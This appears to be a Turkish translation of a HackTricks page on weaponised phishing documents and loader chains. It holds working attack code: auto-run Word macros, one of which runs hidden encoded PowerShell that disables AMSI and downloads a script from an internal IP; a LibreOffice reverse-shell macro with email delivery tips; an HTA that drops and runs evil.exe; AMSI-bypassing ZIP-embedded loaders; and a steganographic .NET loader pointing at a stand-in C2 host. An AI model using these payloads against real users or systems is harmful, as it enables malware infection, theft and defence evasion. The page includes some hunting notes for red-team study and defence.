# Phishing Dosyaları ve Belgeleri

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması biçiminde gerçekleştirilir. Veri yapısının tanımlanması sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma özelliklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarımı gereği makroları desteklemez; ancak RTF olarak yeniden adlandırılmış bir DOCM dosyası Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite içindeki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, macro içeren remote template'e (File –Options –Add-ins –Manage: Templates –Go) referans veriyorsa macro'ları da “execute” edebilir.

### External Image Load

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Document'tan arbitrary code çalıştırmak için macro'ları kullanmak mümkündür.

#### Autoload functions

Daha yaygın oldukları için AV'nin bunları detect etme olasılığı daha yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** seçeneğine gidin; bu, Document Inspector'ı açar. **Inspect** seçeneğine, ardından **Document Properties and Personal Information** öğesinin yanındaki **Remove All** seçeneğine tıklayın.

#### Doc Extension

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve formatı **`.docx`** yerine **Word 97-2003 `.doc`** olarak değiştirin.\
Bunu yapın; çünkü **makroları bir `.docx` dosyasının içine kaydedemezsiniz** ve makro etkin **`.docm`** extension'ı çevresinde bir **stigma** vardır (ör. thumbnail icon'unda büyük bir `!` bulunur ve bazı web/email gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension'ı en iyi uzlaşmadır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer belgeleri Basic macros içerebilir ve macro'yu **Open Document** event'ine bağlayarak dosya açıldığında bunları otomatik olarak çalıştırabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyle görünür:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, gerçek tırnakları kaçışlamak için bunları kullanır; bu nedenle `...==""")` ile biten payload'lar hem iç komutu hem de Shell argümanını dengede tutar.

Delivery tips:

- `.odt` olarak kaydedin ve macro'yu document event'e bağlayın; böylece document açıldığında hemen çalışır.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece attachment olarak filename string'i değil, file byte'ları gönderilir). Bu, validation yapmadan rastgele `RCPT TO` recipient'larını kabul eden SMTP server'larını abuse ederken critical önem taşır.

## HTA Files

Bir HTA, **HTML ve scripting language'ları (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. User interface'i oluşturur ve browser'ın security model'inin kısıtlamaları olmadan "fully trusted" bir application olarak çalışır.

Bir HTA, genellikle **Internet Explorer ile birlikte installed** olan **`mshta.exe`** kullanılarak çalıştırılır; bu nedenle **`mshta`, IE'ye dependant'tır**. Dolayısıyla IE kaldırılmışsa HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlama

**NTLM authentication'ı "uzaktan" zorlamanın** çeşitli yolları vardır; örneğin kullanıcının erişeceği e-postalara veya HTML içeriklerine **görünmez görseller** ekleyebilirsiniz (HTTP MitM bile olabilir). Ya da kurbanınıza, yalnızca **klasörü açmasıyla** bir **authentication** işlemini **tetikleyecek** dosyaların **adreslerini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication işlemini çalamayacağınızı, aynı zamanda **NTLM relay attacks** gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili campaign'ler, iki meşru decoy document (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Buradaki püf noktası, gerçek PowerShell loader'ın ZIP'in raw bytes verileri içinde benzersiz bir marker'dan sonra saklanması ve .lnk tarafından çıkarılarak tamamen memory içinde çalıştırılmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner tarafından uygulanan tipik akış:

1) Orijinal ZIP'i yaygın path'lerde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut çalışma dizininin parent'ı.
2) ZIP bytes verilerini okuyun ve hardcoded bir marker bulun (ör. xFIQCV). Marker'dan sonraki her şey embedded PowerShell payload'ıdır.
3) ZIP'i %ProgramData% konumuna kopyalayın, oraya extract edin ve meşru görünmesi için decoy .docx'i açın.
4) Mevcut process için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki stage'in obfuscation'ını kaldırın (ör. tüm # karakterlerini kaldırın) ve bunu memory içinde execute edin.

Embedded stage'i çıkarmak ve çalıştırmak için örnek PowerShell skeleton'ı:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Delivery genellikle itibarlı PaaS subdomain'lerini (ör. *.herokuapp.com) kötüye kullanır ve payload'ları filtreleyebilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Bir sonraki aşama sıklıkla base64/XOR shellcode'un şifresini çözer ve disk üzerindeki izleri en aza indirmek için Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı chain'de kullanılan Persistence
- Microsoft Web Browser control'ünün COM TypeLib hijacking'i; böylece IE/Explorer veya bunu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntıları ve kullanıma hazır komutları burada bulabilirsiniz:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verilerinin sonuna eklenmiş ASCII marker string'i (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için parent/user klasörlerini tarayan ve decoy document açan .lnk dosyaları.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI tampering.
- Trusted PaaS domain'leri altında barındırılan linklerle sona eren uzun süreli business thread'leri.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Tekrarlanan başka bir pattern, arka planda gerçek chain'i stage ederken hemen zararsız bir lure açan **document-impersonating `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen workflow:
1. Shortcut **PDF gibi görünür** ve obfuscated bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin token'ları (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalar; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan naif detection'lar komutu kaçırır.
3. Stager önce **decoy document'ı indirir**, victim için açar ve ardından malicious dosyaları arka planda yeniden oluşturur.
4. Payload'lar **junk extension'larla** yazılabilir ve ardından filler karakterleri çıkarılarak yeniden adlandırılabilir; bu da belirgin `.exe` / `.cpl` artifact'larının ortaya çıkmasını geciktirir.
5. Persistence, user-writable bir path'ten trusted host binary başlatan **minute-based scheduled task** ile sağlanır.

Bu pattern'den elde edilen minimal hunting ipuçları:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Tanımak için yararlı bir staging düzeni şöyledir:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir?

Rapid7 vaka çalışmasında, zamanlanmış görev **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar çalıştırıyordu. **`APPWIZ.cpl`** dosyası bunun yanında staging edildiği ve **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary'si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load etti.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob'unu okur
- Blob'u **Windows CNG / `bcrypt.dll`** üzerinden decrypt eder
- Çalıştırılabilir memory ayırır ve decrypt edilen shellcode'u kopyalar
- Shellcode pointer'ını **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı biçimde çalıştırır

Bu son adım ayrıca aranmalıdır: malware çoğu zaman doğrudan `((void(*)())buf)()` jump'ı kullanmak yerine, execution aktarımı için **callback alan meşru bir WinAPI**'yi kötüye kullanır.

Bu campaign'deki decrypt edilen payload, daha sonra final PE'yi tamamen memory'ye map eden ve execution'ı devretmeden önce mevcut process içinde **AMSI/WLDP/ETW**'yi patch'leyen **Donut** shellcode'uydu. Side-loading ve memory-resident post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik hunting pivot'ları:
- Görünür bir decoy document'ın ardından `powershell.exe` veya `conhost.exe` çalıştıran `.lnk`.
- **`C:\Users\Public\`** konumuna yapılan kısa ömürlü download'ların ardından nonsense extension'larından yapılan anlık rename işlemleri.
- `GoogleErrorReport` gibi sıradan adlara sahip olan ve **user-writable directories** konumlarından execution gerçekleştiren zamanlanmış görevler.
- Aynı non-system directory konumundan **`.cpl` / `.dll`** dosyaları yükleyen güvenilir binary'ler.
- **`C:\Windows\Tasks\`** altında yazılan ve daha sonra side-loaded module tarafından okunan Base64 text blob'ları.

## Görsellerde Steganography-delimited payload'lar (PowerShell stager)

Recent loader chain'leri, obfuscated bir JavaScript/VBS teslim eder; bu dosya, Base64 içindeki bir PowerShell stager'ı decode eder ve çalıştırır. Bu stager, genellikle GIF olan bir image download eder; image, plain text olarak benzersiz start/end marker'ları arasında gizlenmiş Base64-encoded bir .NET DLL içerir. Script bu delimiter'ları arar (wild'da görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki text'i çıkarır, Base64-decode ederek bytes'a dönüştürür, assembly'yi in-memory yükler ve bilinen bir entry method'u C2 URL'siyle çağırır.<sup>[[5]](#references)</sup>

İş akışı
- Aşama 1: Archived JS/VBS dropper → embedded Base64'i decode eder → `-nop -w hidden -ep bypass` seçenekleriyle PowerShell stager'ı başlatır.
- Aşama 2: PowerShell stager → image download eder, marker-delimited Base64'ü çıkarır, .NET DLL'yi in-memory yükler ve C2 URL'si ile seçenekleri geçirerek method'unu çağırır (ör. VAI).
- Aşama 3: Loader final payload'ı alır ve genellikle process hollowing aracılığıyla güvenilir bir binary'ye (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve trusted utility proxy execution hakkında daha fazlasını burada bulabilirsiniz:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir image'dan DLL çıkarmak ve bir .NET method'unu in-memory çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003 (steganography/marker-hiding) tekniğidir.<sup>[[6]](#references)</sup> Marker'lar campaign'ler arasında değişiklik gösterir.
- Assembly yüklenmeden önce AMSI/ETW bypass ve string deobfuscation yaygın olarak uygulanır.
- Hunting: indirilen image'ları bilinen delimiter'lar için tarayın; image'lara erişen ve hemen Base64 blob'larını decode eden PowerShell süreçlerini belirleyin.

Ayrıca stego tools ve carving techniques bölümüne bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yaygın bir initial stage, bir archive içinde teslim edilen küçük ve yoğun biçimde obfuscated bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki stage'i başlatmak üzere `-nop -w hidden -ep bypass` parametreleriyle PowerShell çalıştırmaktır.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Kendi file içeriğini oku
- Junk string'ler arasındaki bir Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `powershell.exe`'yi çağırarak `wscript.exe`/`cscript.exe` ile çalıştır

Hunting ipuçları
- Komut satırında `-enc`/`FromBase64String` bulunan ve `powershell.exe` başlatan archived JS/VBS attachment'ları.
- User temp path'lerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## NTLM hash'lerini çalmak için Windows files

**NTLM creds çalınabilecek yerler** hakkındaki sayfayı kontrol edin:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedefleyen gelişmiş bir Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-Themed Loader Chain üzerinden Dropping Elephant Tradecraft'ının takibi](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar teslim ediyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
